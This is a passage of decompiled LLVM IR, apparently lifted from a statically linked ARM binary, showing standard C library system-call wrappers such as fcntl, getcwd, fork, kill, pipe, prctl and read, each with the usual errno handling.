  %v2_f4ec = icmp ugt i32 %v0_f4e8, -4097
  br i1 %v2_f4ec, label %bb2, label %bb

bb2:                                              ; preds = %bb1, %dec_label_pc_f4e8
  %v0_f4f4 = call i32 @__syscall_error()
  ret i32 %v0_f4f4

; uselistorder directives
  uselistorder i32 %v0_f4e8, { 1, 2, 0 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_f500 = load i32, i32* @r2, align 4
  %v1_f510 = add i32 %arg2, -12
  store i32 %v6_f500, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_f510, 2
  br i1 %tmp, label %dec_label_pc_f538, label %dec_label_pc_f530

dec_label_pc_f530:                                ; preds = %entry
  %v0_f530 = call i32 @__GI_fcntl64()
  br label %dec_label_pc_f564

dec_label_pc_f538:                                ; preds = %entry
  %v2_f540 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_f540, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_f540, -4095
  br i1 %tmp8, label %dec_label_pc_f564, label %dec_label_pc_f550

dec_label_pc_f550:                                ; preds = %dec_label_pc_f538
  %v0_f550 = call i32 @__errno_location()
  %v0_f554 = load i32, i32* %r4.global-to-local, align 4
  %v1_f554 = sub i32 0, %v0_f554
  %v2_f558 = inttoptr i32 %v0_f550 to i32*
  store i32 %v1_f554, i32* %v2_f558, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f564

dec_label_pc_f564:                                ; preds = %dec_label_pc_f550, %dec_label_pc_f538, %dec_label_pc_f530
  %storemerge = phi i32 [ %v0_f530, %dec_label_pc_f530 ], [ %v2_f540, %dec_label_pc_f538 ], [ -1, %dec_label_pc_f550 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_f540, { 1, 0, 2 }
}

define i32 @__GI_fcntl64() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_f594 = load i32, i32* @r0, align 4
  store i32 %v0_f594, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f594, -4095
  br i1 %tmp, label %dec_label_pc_f5b0, label %dec_label_pc_f5a0

dec_label_pc_f5a0:                                ; preds = %entry
  %v0_f5a0 = call i32 @__errno_location()
  %v0_f5a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f5a4 = sub i32 0, %v0_f5a4
  %v2_f5a8 = inttoptr i32 %v0_f5a0 to i32*
  store i32 %v1_f5a4, i32* %v2_f5a8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f5b0

dec_label_pc_f5b0:                                ; preds = %entry, %dec_label_pc_f5a0
  %v0_f5b0 = phi i32 [ %v0_f594, %entry ], [ -1, %dec_label_pc_f5a0 ]
  ret i32 %v0_f5b0

; uselistorder directives
  uselistorder i32 %v0_f594, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f5b0, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f5ec = load i32, i32* @r4, align 4
  store i32 %v3_f5ec, i32* %stack_var_-8, align 4
  %v0_f5f0 = call i32 @chdir()
  store i32 %v0_f5f0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f5f0, -4095
  br i1 %tmp, label %dec_label_pc_f610, label %dec_label_pc_f600

dec_label_pc_f600:                                ; preds = %entry
  %v0_f600 = call i32 @__errno_location()
  %v0_f604 = load i32, i32* %r4.global-to-local, align 4
  %v1_f604 = sub i32 0, %v0_f604
  %v2_f608 = inttoptr i32 %v0_f600 to i32*
  store i32 %v1_f604, i32* %v2_f608, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f610

dec_label_pc_f610:                                ; preds = %entry, %dec_label_pc_f600
  %v0_f610 = phi i32 [ %v0_f5f0, %entry ], [ -1, %dec_label_pc_f600 ]
  %v2_f614 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f614, i32* @r4, align 4
  ret i32 %v0_f610

; uselistorder directives
  uselistorder i32 %v0_f5f0, { 1, 0, 2 }
  uselistorder i32 ()* @chdir, { 1, 0 }
  uselistorder label %dec_label_pc_f610, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f618 = load i32, i32* @r4, align 4
  store i32 %v3_f618, i32* %stack_var_-8, align 4
  %v1_f61c = call i32 @close(i32 %arg1)
  store i32 %v1_f61c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_f61c, -4095
  br i1 %tmp, label %dec_label_pc_f63c, label %dec_label_pc_f62c

dec_label_pc_f62c:                                ; preds = %entry
  %v0_f62c = call i32 @__errno_location()
  %v0_f630 = load i32, i32* %r4.global-to-local, align 4
  %v1_f630 = sub i32 0, %v0_f630
  %v2_f634 = inttoptr i32 %v0_f62c to i32*
  store i32 %v1_f630, i32* %v2_f634, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f63c

dec_label_pc_f63c:                                ; preds = %entry, %dec_label_pc_f62c
  %v0_f63c = phi i32 [ %v1_f61c, %entry ], [ -1, %dec_label_pc_f62c ]
  %v2_f640 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f640, i32* @r4, align 4
  ret i32 %v0_f63c

; uselistorder directives
  uselistorder i32 %v1_f61c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f63c, { 1, 0 }
}

define i32 @dup2() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f644 = load i32, i32* @r4, align 4
  store i32 %v3_f644, i32* %stack_var_-8, align 4
  %v0_f648 = call i32 @dup2()
  store i32 %v0_f648, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f648, -4095
  br i1 %tmp, label %dec_label_pc_f668, label %dec_label_pc_f658

dec_label_pc_f658:                                ; preds = %entry
  %v0_f658 = call i32 @__errno_location()
  %v0_f65c = load i32, i32* %r4.global-to-local, align 4
  %v1_f65c = sub i32 0, %v0_f65c
  %v2_f660 = inttoptr i32 %v0_f658 to i32*
  store i32 %v1_f65c, i32* %v2_f660, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f668

dec_label_pc_f668:                                ; preds = %entry, %dec_label_pc_f658
  %v0_f668 = phi i32 [ %v0_f648, %entry ], [ -1, %dec_label_pc_f658 ]
  %v2_f66c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f66c, i32* @r4, align 4
  ret i32 %v0_f668

; uselistorder directives
  uselistorder i32 %v0_f648, { 1, 0, 2 }
  uselistorder i32 ()* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f668, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f670 = load i32, i32* @r4, align 4
  store i32 %v3_f670, i32* %stack_var_-8, align 4
  %v0_f674 = call i32 @fork()
  store i32 %v0_f674, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f674, -4095
  br i1 %tmp, label %dec_label_pc_f694, label %dec_label_pc_f684

dec_label_pc_f684:                                ; preds = %entry
  %v0_f684 = call i32 @__errno_location()
  %v0_f688 = load i32, i32* %r4.global-to-local, align 4
  %v1_f688 = sub i32 0, %v0_f688
  %v2_f68c = inttoptr i32 %v0_f684 to i32*
  store i32 %v1_f688, i32* %v2_f68c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f694

dec_label_pc_f694:                                ; preds = %entry, %dec_label_pc_f684
  %v0_f694 = phi i32 [ %v0_f674, %entry ], [ -1, %dec_label_pc_f684 ]
  %v2_f698 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f698, i32* @r4, align 4
  ret i32 %v0_f694

; uselistorder directives
  uselistorder i32 %v0_f674, { 1, 0, 2 }
  uselistorder i32 ()* @fork, { 1, 0 }
  uselistorder label %dec_label_pc_f694, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_f69c = load i32, i32* @r4, align 4
  store i32 %v3_f69c, i32* %stack_var_-20, align 4
  %v6_f69c = load i32, i32* @r5, align 4
  %v9_f69c = load i32, i32* @r6, align 4
  %v12_f69c = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  %v2_f6a0 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r5, align 4
  %v2_f6ac = icmp eq i32 %arg1, 0
  br i1 %v2_f6a0, label %dec_label_pc_f6ac, label %dec_label_pc_f6dc

dec_label_pc_f6ac:                                ; preds = %entry
  br i1 %v2_f6ac, label %dec_label_pc_f6c8, label %dec_label_pc_f6b4

dec_label_pc_f6b4:                                ; preds = %dec_label_pc_f6ac
  %v0_f6b4 = call i32 @__errno_location()
  %v0_f6b8 = load i32, i32* @r7, align 4
  store i32 %v0_f6b8, i32* @r5, align 4
  %v2_f6c0 = inttoptr i32 %v0_f6b4 to i32*
  store i32 22, i32* %v2_f6c0, align 4
  br label %dec_label_pc_f76c

dec_label_pc_f6c8:                                ; preds = %dec_label_pc_f6ac
  %v0_f6c8 = call i32 @__GI_getpagesize()
  %v5_f6d0 = icmp slt i32 %v0_f6c8, 4096
  br i1 %v5_f6d0, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_f6c8
  store i32 %v0_f6c8, i32* @r4, align 4
  br label %dec_label_pc_f6ec

bb15:                                             ; preds = %dec_label_pc_f6c8
  store i32 4096, i32* @r4, align 4
  br label %dec_label_pc_f6ec

dec_label_pc_f6dc:                                ; preds = %entry
  store i32 %arg2, i32* @r4, align 4
  br i1 %v2_f6ac, label %dec_label_pc_f6ec, label %bb16

bb16:                                             ; preds = %dec_label_pc_f6dc
  store i32 %arg1, i32* @r6, align 4
  br label %dec_label_pc_f6fc

dec_label_pc_f6ec:                                ; preds = %dec_label_pc_f6dc, %bb, %bb15
  %v0_f6ec = phi i32 [ %v0_f6c8, %bb ], [ 4096, %bb15 ], [ %arg2, %dec_label_pc_f6dc ]
  %v1_f6f0 = call i32 @malloc(i32 %v0_f6ec)
  store i32 %v1_f6f0, i32* @r6, align 4
  %v2_f6f4 = icmp eq i32 %v1_f6f0, 0
  br i1 %v2_f6f4, label %dec_label_pc_f768, label %dec_label_pc_f6ec.dec_label_pc_f6fc_crit_edge

dec_label_pc_f6ec.dec_label_pc_f6fc_crit_edge:    ; preds = %dec_label_pc_f6ec
  %v0_f6fc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_f6fc

dec_label_pc_f6fc:                                ; preds = %bb16, %dec_label_pc_f6ec.dec_label_pc_f6fc_crit_edge
  %v0_f700 = phi i32 [ %v1_f6f0, %dec_label_pc_f6ec.dec_label_pc_f6fc_crit_edge ], [ %arg1, %bb16 ]
  %v0_f6fc = phi i32 [ %v0_f6fc.pre, %dec_label_pc_f6ec.dec_label_pc_f6fc_crit_edge ], [ %arg2, %bb16 ]
  %v2_f704 = call i32 @getcwd(i32 %v0_f700, i32 %v0_f6fc)
  store i32 %v2_f704, i32* @r4, align 4
  %tmp = icmp ult i32 %v2_f704, -4095
  br i1 %tmp, label %dec_label_pc_f724, label %dec_label_pc_f714

dec_label_pc_f714:                                ; preds = %dec_label_pc_f6fc
  %v0_f714 = call i32 @__errno_location()
  %v0_f718 = load i32, i32* @r4, align 4
  %v1_f718 = sub i32 0, %v0_f718
  %v2_f71c = inttoptr i32 %v0_f714 to i32*
  store i32 %v1_f718, i32* %v2_f71c, align 4
  br label %dec_label_pc_f754

dec_label_pc_f724:                                ; preds = %dec_label_pc_f6fc
  %v1_f724 = icmp slt i32 %v2_f704, 0
  br i1 %v1_f724, label %dec_label_pc_f754, label %dec_label_pc_f72c

dec_label_pc_f72c:                                ; preds = %dec_label_pc_f724
  %v0_f72c = load i32, i32* @r5, align 4
  %v2_f72c = icmp eq i32 %v0_f72c, 0
  br i1 %v2_f72c, label %bb17, label %dec_label_pc_f748.thread7

dec_label_pc_f748.thread7:                        ; preds = %dec_label_pc_f72c
  br label %dec_label_pc_f76c

bb17:                                             ; preds = %dec_label_pc_f72c
  %v1_f730 = load i32, i32* @r7, align 4
  %v3_f730 = icmp eq i32 %v1_f730, 0
  br i1 %v3_f730, label %dec_label_pc_f748, label %dec_label_pc_f748.thread

dec_label_pc_f748.thread:                         ; preds = %bb17
  br label %bb18

dec_label_pc_f748:                                ; preds = %bb17
  %v0_f73c = load i32, i32* @r6, align 4
  %v2_f740 = call i32 @realloc(i32 %v0_f73c, i32 %v2_f704)
  store i32 %v2_f740, i32* @r5, align 4
  %v2_f748 = icmp eq i32 %v2_f740, 0
  br i1 %v2_f748, label %bb18, label %dec_label_pc_f76c

bb18:                                             ; preds = %dec_label_pc_f748.thread, %dec_label_pc_f748
  %v1_f74c = load i32, i32* @r6, align 4
  store i32 %v1_f74c, i32* @r5, align 4
  br label %dec_label_pc_f76c

dec_label_pc_f754:                                ; preds = %dec_label_pc_f724, %dec_label_pc_f714
  %v0_f754 = load i32, i32* @r5, align 4
  %v2_f754 = icmp eq i32 %v0_f754, 0
  br i1 %v2_f754, label %dec_label_pc_f75c, label %dec_label_pc_f768

dec_label_pc_f75c:                                ; preds = %dec_label_pc_f754
  %v0_f75c = load i32, i32* @r6, align 4
  store i32 %v0_f75c, i32* @r0, align 4
  %v0_f760 = call i32 @free()
  br label %dec_label_pc_f76c

dec_label_pc_f768:                                ; preds = %dec_label_pc_f754, %dec_label_pc_f6ec
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_f76c

dec_label_pc_f76c:                                ; preds = %dec_label_pc_f748.thread7, %bb18, %dec_label_pc_f748, %dec_label_pc_f75c, %dec_label_pc_f6b4, %dec_label_pc_f768
  %v0_f76c = load i32, i32* @r5, align 4
  %v2_f770 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_f770, i32* @r4, align 4
  store i32 %v6_f69c, i32* @r5, align 4
  store i32 %v9_f69c, i32* @r6, align 4
  store i32 %v12_f69c, i32* @r7, align 4
  ret i32 %v0_f76c

; uselistorder directives
  uselistorder i32 %v2_f704, { 2, 3, 0, 1 }
  uselistorder i32 %v0_f6c8, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_f76c, { 5, 3, 1, 2, 0, 4 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_f6fc, { 1, 0 }
  uselistorder label %dec_label_pc_f6ec, { 0, 2, 1 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_f778 = ptrtoint i32* %stack_var_-12 to i32
  %v2_f784 = call i32 @getrlimit(i32 7, i32 %v2_f778)
  %v1_f788 = icmp slt i32 %v2_f784, 0
  br i1 %v1_f788, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v5_f790 = load i32, i32* %stack_var_-12, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_f798 = phi i32 [ 256, %entry ], [ %v5_f790, %bb ]
  ret i32 %v5_f798

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v2_f7a0 = load i32, i32* @global_var_29774.293, align 4
  %v2_f7a4 = icmp eq i32 %v2_f7a0, 0
  br i1 %v2_f7a4, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_f7ac = phi i32 [ %v2_f7a0, %entry ], [ 4096, %bb ]
  ret i32 %v1_f7ac

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f7b4 = load i32, i32* @r4, align 4
  store i32 %v3_f7b4, i32* %stack_var_-8, align 4
  %v0_f7b8 = call i32 @getpid()
  store i32 %v0_f7b8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f7b8, -4095
  br i1 %tmp, label %dec_label_pc_f7d8, label %dec_label_pc_f7c8

dec_label_pc_f7c8:                                ; preds = %entry
  %v0_f7c8 = call i32 @__errno_location()
  %v0_f7cc = load i32, i32* %r4.global-to-local, align 4
  %v1_f7cc = sub i32 0, %v0_f7cc
  %v2_f7d0 = inttoptr i32 %v0_f7c8 to i32*
  store i32 %v1_f7cc, i32* %v2_f7d0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f7d8

dec_label_pc_f7d8:                                ; preds = %entry, %dec_label_pc_f7c8
  %v0_f7d8 = phi i32 [ %v0_f7b8, %entry ], [ -1, %dec_label_pc_f7c8 ]
  %v2_f7dc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f7dc, i32* @r4, align 4
  ret i32 %v0_f7d8

; uselistorder directives
  uselistorder i32 %v0_f7b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f7d8, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f7e0 = load i32, i32* @r4, align 4
  store i32 %v3_f7e0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f804, label %dec_label_pc_f7f4

dec_label_pc_f7f4:                                ; preds = %entry
  %v0_f7f4 = call i32 @__errno_location()
  %v0_f7f8 = load i32, i32* %r4.global-to-local, align 4
  %v1_f7f8 = sub i32 0, %v0_f7f8
  %v2_f7fc = inttoptr i32 %v0_f7f4 to i32*
  store i32 %v1_f7f8, i32* %v2_f7fc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_f808.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f804

dec_label_pc_f804:                                ; preds = %entry, %dec_label_pc_f7f4
  %v2_f808 = phi i32 [ %v3_f7e0, %entry ], [ %v2_f808.pre, %dec_label_pc_f7f4 ]
  %v0_f804 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f7f4 ]
  store i32 %v2_f808, i32* @r4, align 4
  ret i32 %v0_f804

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f804, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v0_f828 = load i32, i32* @r0, align 4
  %v3_f828 = call i32 @ioctl(i32 %v0_f828, i32 %arg1, i32 %arg2)
  store i32 %v3_f828, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v3_f828, -4095
  br i1 %tmp, label %dec_label_pc_f848, label %dec_label_pc_f838

dec_label_pc_f838:                                ; preds = %entry
  %v0_f838 = call i32 @__errno_location()
  %v0_f83c = load i32, i32* %r4.global-to-local, align 4
  %v1_f83c = sub i32 0, %v0_f83c
  %v2_f840 = inttoptr i32 %v0_f838 to i32*
  store i32 %v1_f83c, i32* %v2_f840, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f848

dec_label_pc_f848:                                ; preds = %entry, %dec_label_pc_f838
  %v0_f848 = phi i32 [ %v3_f828, %entry ], [ -1, %dec_label_pc_f838 ]
  ret i32 %v0_f848

; uselistorder directives
  uselistorder i32 %v3_f828, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f848, { 1, 0 }
}

define i32 @kill() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f85c = load i32, i32* @r4, align 4
  store i32 %v3_f85c, i32* %stack_var_-8, align 4
  %v0_f860 = call i32 @kill()
  store i32 %v0_f860, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f860, -4095
  br i1 %tmp, label %dec_label_pc_f880, label %dec_label_pc_f870

dec_label_pc_f870:                                ; preds = %entry
  %v0_f870 = call i32 @__errno_location()
  %v0_f874 = load i32, i32* %r4.global-to-local, align 4
  %v1_f874 = sub i32 0, %v0_f874
  %v2_f878 = inttoptr i32 %v0_f870 to i32*
  store i32 %v1_f874, i32* %v2_f878, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f880

dec_label_pc_f880:                                ; preds = %entry, %dec_label_pc_f870
  %v0_f880 = phi i32 [ %v0_f860, %entry ], [ -1, %dec_label_pc_f870 ]
  %v2_f884 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f884, i32* @r4, align 4
  ret i32 %v0_f880

; uselistorder directives
  uselistorder i32 %v0_f860, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f880, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_f898 = and i32 %arg2, 64
  %v2_f898 = icmp eq i32 %v1_f898, 0
  br i1 %v2_f898, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v6_f888 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_f888, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_f8a8 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_f8a8, i32* @r2, align 4
  %v4_f8b0 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_f8b4 = icmp eq i32 %v4_f8b0, -4096
  store i1 %v7_f8b4, i1* @cpsr_z, align 1
  store i32 %v4_f8b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_f8b0, -4095
  br i1 %tmp, label %dec_label_pc_f8d0, label %dec_label_pc_f8c0

dec_label_pc_f8c0:                                ; preds = %.thread1
  %v0_f8c0 = call i32 @__errno_location()
  %v0_f8c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_f8c4 = sub i32 0, %v0_f8c4
  %v2_f8c8 = inttoptr i32 %v0_f8c0 to i32*
  store i32 %v1_f8c4, i32* %v2_f8c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f8d0

dec_label_pc_f8d0:                                ; preds = %.thread1, %dec_label_pc_f8c0
  %v0_f8d0 = phi i32 [ %v4_f8b0, %.thread1 ], [ -1, %dec_label_pc_f8c0 ]
  ret i32 %v0_f8d0

; uselistorder directives
  uselistorder i32 %v4_f8b0, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_f8d0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_f8ec = load i32, i32* @r0, align 4
  %v2_f8ec = inttoptr i32 %v0_f8ec to i8*
  %v3_f8ec = call i32 @__libc_open(i8* %v2_f8ec, i32 577)
  %v0_f8f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f8f0, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_f8f0 = and i32 %v3_f8ec, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_f8f0 = phi i32 [ %v3_f8ec, %entry ], [ %v6_f8f0, %bb ]
  ret i32 %v7_f8f0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f8f4 = load i32, i32* @r4, align 4
  store i32 %v3_f8f4, i32* %stack_var_-8, align 4
  %v1_f8f8 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_f8f8 = call i32 @pipe([2 x i32] %v1_f8f8)
  store i32 %v2_f8f8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_f8f8, -4095
  br i1 %tmp, label %dec_label_pc_f918, label %dec_label_pc_f908

dec_label_pc_f908:                                ; preds = %entry
  %v0_f908 = call i32 @__errno_location()
  %v0_f90c = load i32, i32* %r4.global-to-local, align 4
  %v1_f90c = sub i32 0, %v0_f90c
  %v2_f910 = inttoptr i32 %v0_f908 to i32*
  store i32 %v1_f90c, i32* %v2_f910, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f918

dec_label_pc_f918:                                ; preds = %entry, %dec_label_pc_f908
  %v0_f918 = phi i32 [ %v2_f8f8, %entry ], [ -1, %dec_label_pc_f908 ]
  %v2_f91c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f91c, i32* @r4, align 4
  ret i32 %v0_f918

; uselistorder directives
  uselistorder i32 %v2_f8f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f918, { 1, 0 }
}

define i32 @prctl() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f920 = load i32, i32* @r4, align 4
  store i32 %v3_f920, i32* %stack_var_-8, align 4
  %v0_f928 = call i32 @prctl()
  store i32 %v0_f928, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_f928, -4095
  br i1 %tmp, label %dec_label_pc_f948, label %dec_label_pc_f938

dec_label_pc_f938:                                ; preds = %entry
  %v0_f938 = call i32 @__errno_location()
  %v0_f93c = load i32, i32* %r4.global-to-local, align 4
  %v1_f93c = sub i32 0, %v0_f93c
  %v2_f940 = inttoptr i32 %v0_f938 to i32*
  store i32 %v1_f93c, i32* %v2_f940, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f948

dec_label_pc_f948:                                ; preds = %entry, %dec_label_pc_f938
  %v0_f948 = phi i32 [ %v0_f928, %entry ], [ -1, %dec_label_pc_f938 ]
  %v2_f94c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f94c, i32* @r4, align 4
  ret i32 %v0_f948

; uselistorder directives
  uselistorder i32 %v0_f928, { 1, 0, 2 }
  uselistorder i32 ()* @prctl, { 1, 0 }
  uselistorder label %dec_label_pc_f948, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f950 = load i32, i32* @r4, align 4
  store i32 %v3_f950, i32* %stack_var_-8, align 4
  %v1_f954 = load i32, i32* @r1, align 4
  %v2_f954 = inttoptr i32 %v1_f954 to i32*
  %v3_f954 = load i32, i32* @r2, align 4
  %v4_f954 = call i32 @read(i32 %arg1, i32* %v2_f954, i32 %v3_f954)
  store i32 %v4_f954, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_f954, -4095
  br i1 %tmp, label %dec_label_pc_f974, label %dec_label_pc_f964

dec_label_pc_f964:                                ; preds = %entry
  %v0_f964 = call i32 @__errno_location()
  %v0_f968 = load i32, i32* %r4.global-to-local, align 4
  %v1_f968 = sub i32 0, %v0_f968
  %v2_f96c = inttoptr i32 %v0_f964 to i32*
  store i32 %v1_f968, i32* %v2_f96c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f974

dec_label_pc_f974:                                ; preds = %entry, %dec_label_pc_f964
  %v0_f974 = phi i32 [ %v4_f954, %entry ], [ -1, %dec_label_pc_f964 ]
  %v2_f978 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_f978, i32* @r4, align 4
  ret i32 %v0_f974

; uselistorder directives
  uselistorder i32 %v4_f954, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f974, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_f97c = load i32, i32* @r4, align 4
  store i32 %v3_f97c, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_f9a4, label %dec_label_pc_f994

dec_label_pc_f994:                                ; preds = %entry
  %v0_f994 = call i32 @__errno_location()
  %v0_f998 = load i32, i32* %r4.global-to-local, align 4
  %v1_f998 = sub i32 0, %v0_f998
  %v2_f99c = inttoptr i32 %v0_f994 to i32*
  store i32 %v1_f998, i32* %v2_f99c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_f9a8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_f9a4

dec_label_pc_f9a4:                                ; preds = %entry, %dec_label_pc_f994
  %v2_f9a8 = phi i32 [ %v3_f97c, %entry ], [ %v2_f9a8.pre, %dec_label_pc_f994 ]
  %v0_f9a4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_f994 ]
  store i32 %v2_f9a8, i32* @r4, align 4
  ret i32 %v0_f9a4

; uselistorder directives
